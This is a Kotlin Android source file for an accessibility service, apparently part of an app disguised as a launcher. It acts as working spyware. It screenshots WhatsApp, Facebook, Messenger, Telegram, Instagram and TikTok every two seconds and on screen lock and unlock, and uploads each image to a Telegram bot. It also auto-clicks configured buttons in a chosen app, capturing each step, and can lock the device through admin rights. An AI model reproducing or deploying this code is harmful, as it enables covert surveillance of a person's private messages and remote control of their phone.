package com.example.launcher

import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MonitorAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var isShotLoopActive = false
    private var isAutoClickRunning = false
    private var lastAutoClickSignature: String? = null
    private var screenStateReceiver: BroadcastReceiver? = null

    private val monitoredPackages = listOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.facebook.katana",
        "com.facebook.lite",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.instagram.android",
        "com.zhiliaoapp.musically",
        "com.zhiliaoapp.musically.go"
    )

    // Feature 2: Every 2 seconds screenshot for monitored packages (strictly controlled by autoShotEnabled)
    private val screenshotRunnable = object : Runnable {
        override fun run() {
            val prefs = Prefs(this@MonitorAccessibilityService)
            if (!prefs.running || !prefs.autoShotEnabled) {
                stopScreenshotLoop()
                return
            }

            val activePackage = getCurrentActivePackage()
            if (activePackage != packageName && activePackage != null && monitoredPackages.contains(activePackage)) {
                captureAndSendScreenshot(activePackage, "app_$activePackage", prefs)
                handler.postDelayed(this, 2000)
            } else {
                stopScreenshotLoop()
            }
        }
    }

    // Feature 1: Every 1 second check for target package & sequential 10-step auto clicker (strictly controlled by autoClickEnabled)
    private val autoClickWatchRunnable = object : Runnable {
        override fun run() {
            val prefs = Prefs(this@MonitorAccessibilityService)
            if (!prefs.running || !prefs.autoClickEnabled) {
                isAutoClickRunning = false
                handler.postDelayed(this, 1000)
                return
            }

            val targetPkg = prefs.autoClickTargetPackage.trim()
            val activePkg = getCurrentActivePackage()

            if (targetPkg.isNotEmpty() && activePkg == targetPkg && !isAutoClickRunning) {
                val activeSteps = prefs.autoClickSteps.filter { it.isNotBlank() }
                if (activeSteps.isNotEmpty()) {
                    val signature = "$targetPkg:${prefs.autoClickTriggerId}"
                    if (signature != lastAutoClickSignature) {
                        isAutoClickRunning = true
                        lastAutoClickSignature = signature
                        executeStepAtIndex(targetPkg, activeSteps, 0, prefs, 0)
                    }
                }
            } else if (activePkg != targetPkg) {
                lastAutoClickSignature = null
            }

            handler.postDelayed(this, 1000)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        registerScreenReceiver()
        handler.removeCallbacks(autoClickWatchRunnable)
        handler.post(autoClickWatchRunnable)
    }

    fun lockScreenNow() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminName = ComponentName(this, ScreenAdminReceiver::class.java)
            if (dpm.isAdminActive(adminName)) {
                dpm.lockNow()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopScreenshotLoop() {
        isShotLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
    }

    private fun getCurrentActivePackage(): String? {
        return rootInActiveWindow?.packageName?.toString()
    }

    private fun executeStepAtIndex(
        targetPackage: String,
        steps: List<String>,
        stepIndex: Int,
        prefs: Prefs,
        attempt: Int
    ) {
        if (!prefs.running || !prefs.autoClickEnabled) {
            isAutoClickRunning = false
            return
        }

        if (stepIndex >= steps.size) {
            isAutoClickRunning = false
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(homeIntent)
            return
        }

        val currentPkg = getCurrentActivePackage()
        if (currentPkg != targetPackage) {
            isAutoClickRunning = false
            return
        }

        val stepText = steps[stepIndex].trim()
        if (stepText.isEmpty()) {
            executeStepAtIndex(targetPackage, steps, stepIndex + 1, prefs, 0)
            return
        }

        val rootNode = rootInActiveWindow
        val matchedNodes = rootNode?.findAccessibilityNodeInfosByText(stepText) ?: emptyList()
        var clicked = false

        for (node in matchedNodes) {
            if (clickNodeOrParent(node)) {
                clicked = true
                break
            }
        }

        if (clicked) {
            handler.postDelayed({
                if (prefs.running && prefs.autoClickEnabled) {
                    captureAndSendScreenshot(targetPackage, "${targetPackage}_step_${stepIndex + 1}", prefs)
                }
                handler.postDelayed({
                    executeStepAtIndex(targetPackage, steps, stepIndex + 1, prefs, 0)
                }, 1500)
            }, 1200)
        } else {
            if (attempt < 8) {
                handler.postDelayed({
                    executeStepAtIndex(targetPackage, steps, stepIndex, prefs, attempt + 1)
                }, 1000)
            } else {
                isAutoClickRunning = false
            }
        }
    }

    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        var clickableNode: AccessibilityNodeInfo? = node
        while (clickableNode != null) {
            if (clickableNode.isClickable) {
                return clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            clickableNode = clickableNode.parent
        }
        return false
    }

    private fun registerScreenReceiver() {
        if (screenStateReceiver != null) return
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenStateReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val prefs = Prefs(this@MonitorAccessibilityService)
                if (!prefs.running) return
                when (intent?.action) {
                    Intent.ACTION_SCREEN_OFF -> captureScreenEvent("screen_off", prefs)
                    Intent.ACTION_USER_PRESENT -> {
                        handler.postDelayed({ captureScreenEvent("screen_unlocked", prefs) }, 1000)
                    }
                }
            }
        }
        registerReceiver(screenStateReceiver, filter)
    }

    private fun captureScreenEvent(tag: String, prefs: Prefs) {
        captureAndSendScreenshot("", tag, prefs)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val prefs = Prefs(this)
        if (!prefs.running || !prefs.autoShotEnabled) {
            stopScreenshotLoop()
            return
        }

        val packageName = event.packageName?.toString() ?: return

        if (monitoredPackages.contains(packageName) && packageName != this.packageName) {
            if (!isShotLoopActive) {
                isShotLoopActive = true
                handler.removeCallbacks(screenshotRunnable)
                handler.post(screenshotRunnable)
            }
        } else if (packageName != this.packageName) {
            stopScreenshotLoop()
        }
    }

    private fun captureAndSendScreenshot(currentPackage: String, customPrefix: String, prefs: Prefs) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        val hardwareBuffer = screenshot.hardwareBuffer
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                        hardwareBuffer.close()

                        if (bitmap != null) {
                            val mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true)
                            val stream = ByteArrayOutputStream()
                            mutableBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                            sendTelegramPhoto(stream.toByteArray(), customPrefix, prefs)
                        }
                    }

                    override fun onFailure(errorCode: Int) {}
                }
            )
        }
    }

    private fun sendTelegramPhoto(photoBytes: ByteArray, prefix: String, prefs: Prefs) {
        val botToken = prefs.telegramBotToken.trim()
        val chatId = prefs.telegramChatId.trim()
        if (botToken.isEmpty() || chatId.isEmpty()) return

        Thread {
            try {
                val timeStamp = System.currentTimeMillis()
                val fileName = "${prefix}_${timeStamp}.jpg"

                val boundary = "Boundary_" + System.currentTimeMillis()
                val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val outputStream = conn.outputStream
                val writer = OutputStreamWriter(outputStream, "UTF-8")

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.append("$chatId\r\n")
                writer.flush()

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
                writer.append("Content-Type: image/jpeg\r\n\r\n")
                writer.flush()

                outputStream.write(photoBytes)
                outputStream.flush()

                writer.append("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()

                conn.responseCode
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        stopScreenshotLoop()
        isAutoClickRunning = false
        handler.removeCallbacks(autoClickWatchRunnable)
        if (screenStateReceiver != null) {
            try {
                unregisterReceiver(screenStateReceiver)
            } catch (_: Exception) {
            }
            screenStateReceiver = null
        }
        if (instance === this) {
            instance = null
        }
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {
        stopScreenshotLoop()
        isAutoClickRunning = false
        handler.removeCallbacks(autoClickWatchRunnable)
    }

    companion object {
        @Volatile
        var instance: MonitorAccessibilityService? = null
    }
}
